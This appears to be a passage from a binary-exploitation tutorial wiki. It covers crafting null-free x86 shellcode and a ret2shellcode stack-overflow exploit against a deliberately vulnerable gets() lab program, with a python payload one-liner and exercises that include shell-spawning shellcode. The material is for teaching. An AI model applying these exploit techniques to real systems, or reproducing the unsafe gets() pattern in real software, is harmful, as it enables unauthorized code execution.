<p>You can use this code to debug the shellcode and test it</p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20</pre></div></td><td class="code"><div class="codehilite" id="__code_14"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_14 pre, #__code_14 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="cm">/* shellcode.c */</span>
<span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> \
<span class="s">"</span><span class="se">\xeb\x1e\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x59\xba\x0e</span><span class="s">"</span> \
<span class="s">"</span><span class="se">\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00</span><span class="s">"</span> \
<span class="s">"</span><span class="se">\xcd\x80\xe8\xdd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77</span><span class="s">"</span> \
<span class="s">"</span><span class="se">\x6f\x72\x6c\x64\x21\x0a</span><span class="s">"</span><span class="p">;</span>

<span class="n">main</span><span class="p">()</span>
<span class="p">{</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode Length:  %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">code</span><span class="p">));</span>

    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">code</span><span class="p">;</span>

    <span class="n">ret</span><span class="p">();</span>

<span class="p">}</span>
</pre></div>
</td></tr></tbody></table>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite" id="__code_15"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_15 pre, #__code_15 code"><span class="md-clipboard__message"></span></button><pre><span></span>$ gcc -m32 -fno-stack-protector -z execstack -no-pie  shellcode.c
</pre></div>
</td></tr></tbody></table>
<p>We have successfully created a shellcode , but the problem is NULL 
characters , in C a string is represented by a character array which 
ends with with a NULL character . This may cause problems with the 
shellcode when some string handling function manipulates this . So we 
will always try to make our shellcode NULL free.</p>
<p>Only way is to use assembly instruction which will not produce any NULL characters in them.</p>
<p><code>mov eax, 0x4</code> , here the move instruction uses a 32 bit 
register thus the encoding of this instruction also contains space to 
occupy this 32 bit value , since we have only given a constrain which 
only occupies one byte other 3 bytes will be NULL , One way to over come
 this is to move value to a lower register here <code>al</code></p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite" id="__code_16"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_16 pre, #__code_16 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="n">mov</span> <span class="n">al</span><span class="p">,</span><span class="mi">0</span><span class="n">x4</span> <span class="o">-&gt;</span> <span class="n">B0</span> <span class="mi">04</span>
</pre></div>
</td></tr></tbody></table>
<p>Using lower register produced a null free code . When doing this we 
have to make sure to make the register value is zero other wise the 
previous value may corrupt our value</p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite" id="__code_17"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_17 pre, #__code_17 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="n">xor</span> <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
</pre></div>
</td></tr></tbody></table>
<p>We can use xor instruction to make the register value null.</p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29</pre></div></td><td class="code"><div class="codehilite" id="__code_18"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_18 pre, #__code_18 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="k">section </span><span class="nv">.text</span>                     <span class="c1">; Text segment</span>
<span class="k">global </span><span class="nv">_start</span>                     <span class="c1">; Default entry point for ELF linking</span>


<span class="nl">_start:</span>
<span class="nf">jmp</span> <span class="nv">gotoCall</span>                      <span class="c1">; Jump to gotCall</span>

<span class="nl">shellcode:</span>
<span class="c1">; SYSCALL: write(1,msg,14)</span>

<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>                      <span class="c1">; Null the registers</span>
<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>
<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span><span class="nb">edx</span>                      <span class="c1">; Does not need to xor ecx since pop will overwrite any previos value</span>

<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">4</span>                        <span class="c1">; Put 4 into eax, since write is syscall #4.</span>
<span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">1</span>                        <span class="c1">; Put 1 into ebx, since stdout is 1.</span>
<span class="nf">pop</span> <span class="nb">ecx</span>                          <span class="c1">; Pop the Address of hello world from the stack</span>
<span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="mi">14</span>                       <span class="c1">; Put 14 into edx, since our string is 14 bytes.</span>
<span class="nf">int</span> <span class="mh">0x80</span>                          <span class="c1">; Call the kernel to make the system call happen.</span>


<span class="c1">; SYSCALL: exit(0)</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">1</span>                        <span class="c1">; Put 1 into eax, since exit is syscall #1.</span>
<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>                      <span class="c1">; Exit with success.</span>
<span class="nf">int</span> <span class="mh">0x80</span>                          <span class="c1">; Do the syscall.</span>

<span class="nl">gotoCall:</span>
<span class="nf">call</span> <span class="nv">shellcode</span>                <span class="c1">; Pushes the address of string to stack</span>
<span class="kd">db</span> <span class="s">"Hello, world!"</span><span class="p">,</span> <span class="mh">0x0a</span>      <span class="c1">; The string and newline char</span>
</pre></div>
</td></tr></tbody></table>
<div class="admonition note">
<p class="admonition-title">Shellcode</p>
<p>"\xeb\x15\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x0e\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe6\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21\x0a"</p>
</div>
<details class="tip"><summary>Practice Problem</summary><ul>
<li>Write a shellcode to open a file and a print it content</li>
</ul>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Use <strong>open</strong> syscall to open the file , then you can use <strong>read</strong> and <strong>write</strong> syscall.</p>
<ul>
<li>Shellcode to spawn a shell</li>
</ul>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>man 2 execve</strong></p>
</details>
<p>Reference:</p>
<p>[1] <a href="https://syscalls.kernelgrok.com/">Linux Syscall Reference</a><img name="kl_1567871733074" style="width: 12px; height: 12px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsSAAALEgHS3X78AAAB3ElEQVQ4jY2TPWhTURTH/+e8l7QNJg0qCJpCSdEnONTFDk5udfILs9mS6iJYpI4VnURXUcRJrFG3gm3tXLpIxaUUIVA/iLRJayQ2Nk1q7cu99zjUF/JhQv7jOff/O+fcwyERAQAQEaoVjsdOirgP93L+W5svJpeq8xVfPWD/yPkepekBWbjETl8nM0h9XtkRV72xLbmdn5hJ/xdw4OaVkC6U7oBwg6MRH0d7fGTbQDoLIYKUXa2/rO5C6SdWOHh/4/HrLQCwvZZUoZi2Dh/ysdPbRZ0dNeOQCMj2WXTiaMCUtsdUKn0dQHcNAEZCVr+DViJjYAW6/NqI34txS0eVIqEwRgfONMTbApyORDE3PIbF9dX2AKPHTyESCFbMExeGMTL9EguZVHuAxY3vmBscwtkjfS3NTQELuQzi72bwaGAQ8elEUzNQtQUiLsmf3X3eCt/n1uBMPQUy2bqSDCIuNXQgjHnJ5kzTUt47rUQY8w0AG2ZcLX/bkc2t5m5mlJdTv22Y8QZAPjGbBPHl8oePRb2yruu9BjBu8msRGrF8YjZZGb3+mA5ePee4ip9xoKOfj/UGSRuYtR/b+ldxyW/paz+fv/0EtLhGT91DF2NgubtXnu4VXk1N1vzFP99f037PUFbu4yIAAAAASUVORK5CYII=" width="12" height="12"></p>
<h2 id="ret2shellcode">ret2shellcode<a class="headerlink" href="#ret2shellcode" title="Permanent link">¶</a></h2>
<p>Let's get into how we can use our previously created shellcode.</p>
<div class="superfences-tabs">
<input name="__tabs_2" type="radio" id="__tab_2_0" checked="checked">
<label for="__tab_2_0">Source code</label>
<div class="superfences-content"><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="codehilite" id="__code_19"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_19 pre, #__code_19 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="cm">/* ret2shellcode.c */</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">inp</span><span class="p">[</span><span class="mh">0x100</span><span class="p">]</span><span class="o">=</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">inp</span><span class="p">);</span>
  <span class="n">strncpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">inp</span><span class="p">,</span><span class="mi">256</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></tbody></table></div>
</div>
<p>Binary file : <a href="https://wiki.bi0s.in/pwning/stack-overflow/ret2shellcode">ret2shellcode</a></p>
<p>The code clearly has a buffer overflow bug which enables us to change
 the control flow of the program by overwriting the saved return address
 of main . Now the question is to find a suitable place to jump .</p>
<p>The main function reads a input from the user and that input is copied to a global variable called buf .</p>
<p>Let's look into the assembly of main</p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19</pre></div></td><td class="code"><div class="codehilite" id="__code_20"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_20 pre, #__code_20 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="nf">$</span> <span class="nv">pidof</span> <span class="nv">ret2shellcode</span>
<span class="err">17255</span>

<span class="nf">$</span> <span class="nv">cat</span> <span class="o">/</span><span class="nv">proc</span><span class="o">/</span><span class="mi">17255</span><span class="o">/</span><span class="nv">maps</span> 
<span class="err">08048000-08049000</span> <span class="nf">r</span><span class="o">-</span><span class="nv">xp</span> <span class="mi">00000000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">01</span> <span class="mi">1516600</span>                            <span class="o">/</span><span class="nv">tmp</span><span class="o">/</span><span class="nv">ret2shellcode</span>
<span class="err">08049000-0804</span><span class="nf">a000</span> <span class="nv">r</span><span class="o">-</span><span class="nv">xp</span> <span class="mi">00000000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">01</span> <span class="mi">1516600</span>                            <span class="o">/</span><span class="nv">tmp</span><span class="o">/</span><span class="nv">ret2shellcode</span>
<span class="err">0804</span><span class="nf">a000</span><span class="o">-</span><span class="mi">0804</span><span class="nv">b000</span> <span class="nv">rwxp</span> <span class="mi">00001000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">01</span> <span class="mi">1516600</span>                            <span class="o">/</span><span class="nv">tmp</span><span class="o">/</span><span class="nv">ret2shellcode</span>
<span class="err">09</span><span class="nf">d0f000</span><span class="o">-</span><span class="mi">09</span><span class="nv">d30000</span> <span class="nv">rwxp</span> <span class="mi">00000000</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="mi">0</span>                                  <span class="p">[</span><span class="nv">heap</span><span class="p">]</span>
<span class="nf">f754e000</span><span class="o">-</span><span class="nv">f76ff000</span> <span class="nv">r</span><span class="o">-</span><span class="nv">xp</span> <span class="mi">00000000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">01</span> <span class="mi">5115852</span>                            <span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">libc</span><span class="o">-</span><span class="mf">2.24</span><span class="nv">.so</span>
<span class="nf">f76ff000</span><span class="o">-</span><span class="nv">f7701000</span> <span class="nv">r</span><span class="o">-</span><span class="nv">xp</span> <span class="mb">001b</span><span class="mi">0000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">01</span> <span class="mi">5115852</span>                            <span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">libc</span><span class="o">-</span><span class="mf">2.24</span><span class="nv">.so</span>
<span class="nf">f7701000</span><span class="o">-</span><span class="nv">f7702000</span> <span class="nv">rwxp</span> <span class="mb">001b</span><span class="mi">2000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">01</span> <span class="mi">5115852</span>                            <span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">libc</span><span class="o">-</span><span class="mf">2.24</span><span class="nv">.so</span>
<span class="nf">f7702000</span><span class="o">-</span><span class="nv">f7705000</span> <span class="nv">rwxp</span> <span class="mi">00000000</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="mi">0</span>
<span class="nf">f7734000</span><span class="o">-</span><span class="nv">f7737000</span> <span class="nv">rwxp</span> <span class="mi">00000000</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="mi">0</span>
<span class="nf">f7737000</span><span class="o">-</span><span class="nv">f7739000</span> <span class="nv">r</span><span class="o">--</span><span class="nv">p</span> <span class="mi">00000000</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="mi">0</span>                                  <span class="p">[</span><span class="nv">vvar</span><span class="p">]</span>
<span class="nf">f7739000</span><span class="o">-</span><span class="nv">f773b000</span> <span class="nv">r</span><span class="o">-</span><span class="nv">xp</span> <span class="mi">00000000</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="mi">0</span>                                  <span class="p">[</span><span class="nv">vdso</span><span class="p">]</span>
<span class="nf">f773b000</span><span class="o">-</span><span class="nv">f775e000</span> <span class="nv">r</span><span class="o">-</span><span class="nv">xp</span> <span class="mi">00000000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">01</span> <span class="mi">5115848</span>                            <span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">ld</span><span class="o">-</span><span class="mf">2.24</span><span class="nv">.so</span>
<span class="nf">f775e000</span><span class="o">-</span><span class="nv">f775f000</span> <span class="nv">r</span><span class="o">-</span><span class="nv">xp</span> <span class="mi">00022000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">01</span> <span class="mi">5115848</span>                            <span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">ld</span><span class="o">-</span><span class="mf">2.24</span><span class="nv">.so</span>
<span class="nf">f775f000</span><span class="o">-</span><span class="nv">f7760000</span> <span class="nv">rwxp</span> <span class="mi">00023000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">01</span> <span class="mi">5115848</span>                            <span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">ld</span><span class="o">-</span><span class="mf">2.24</span><span class="nv">.so</span>
<span class="nf">ffdd5000</span><span class="o">-</span><span class="nv">ffdf6000</span> <span class="nv">rwxp</span> <span class="mi">00000000</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="mi">0</span>                                  <span class="p">[</span><span class="nv">stack</span><span class="p">]</span>
</pre></div>
</td></tr></tbody></table>
<p>It is the memory mapping of our program , In linux all the details about a process is inside <code>/proc/$PID/</code> directory and the maps file holds the detail of the processes memory mapping , the <code>pidof</code> command returns the PID of the process.</p>
<p>If you notice the address of buf <code>0x804a040</code> lies between <code>0x0804a000-0x0804b000</code>
 address and the previous output shows us that that region has 
executable permission . ie , if we put some valid instruction at that 
address and change the execution flow to that address those instruction 
it will be executed.</p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite" id="__code_21"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_21 pre, #__code_21 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="mi">0804</span><span class="n">a000</span><span class="o">-</span><span class="mi">0804</span><span class="n">b000</span> <span class="n">rwxp</span> <span class="mi">00001000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">01</span> <span class="mi">1516600</span>   <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ret2shellcode</span>
</pre></div>
</td></tr></tbody></table>
<p>So , we can give our shellcode as an input and overflow the return 
address to jump to the address of buf , and our shellcode will be 
executed</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>if the shellcode contains a null character , <code>strncpy</code> function will only copy the input till that position other will be discarded , this will corrupt our shellcode copied into <code>buf</code>.</p>
</div>
<p>So our payload will contain <code>shellcode + junk + address of buf (overwrites return address)</code>.</p>
<p>If you use the shellcode we generated above it will cause problem since our hello world string ends with a new line , the <code>gets</code>
 function stops reading when a new line is encountered thus rest of the 
payload will not be taken , we just need to change the last "\x0a" byte 
to a null byte .</p>
<div class="admonition tip">
<p class="admonition-title">Exploit</p>
<p>python -c 'print 
"\xeb\x15\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x0e\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe6\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21\x00"
 + "A" * 222 + "\x08\x04\xa0\x40"[::-1]' | ./ret2shellcode</p>
</div>
<div class="superfences-tabs">
<input name="__tabs_3" type="radio" id="__tab_3_0" checked="checked">
<label for="__tab_3_0">Output</label>
<div class="superfences-content"><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite" id="__code_22"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_22 pre, #__code_22 code"><span class="md-clipboard__message"></span></button><pre><span></span>    <span class="n">Hello</span><span class="p">,</span> <span class="n">world</span><span class="o">!</span>
</pre></div>
</td></tr></tbody></table></div>
</div>
<p>We have successfully executed the shellcode , you can debug the program with gdb to see the magic happening.</p>
</article>
</div>
</div>
</main>
<footer class="md-footer">
<div class="md-footer-nav">
<nav class="md-footer-nav__inner md-grid">
<a href="/help/bi0s_wiki/pwning/return2libc/return-to-libc/" title="ret2libc" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
<div class="md-flex__cell md-flex__cell--shrink">
</div>
<div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
<span class="md-flex__ellipsis">
<span class="md-footer-nav__direction">
Previous
</span>
ret2libc
</span>
</div>
</a>
<a href="/help/bi0s_wiki/pwning/format-string/fmt/" title="Introduction" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
<div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
<span class="md-flex__ellipsis">
<span class="md-footer-nav__direction">
Next
</span>
Introduction
</span>
</div>
<div class="md-flex__cell md-flex__cell--shrink">
</div>
</a>
</nav>
</div>
{% endblock %}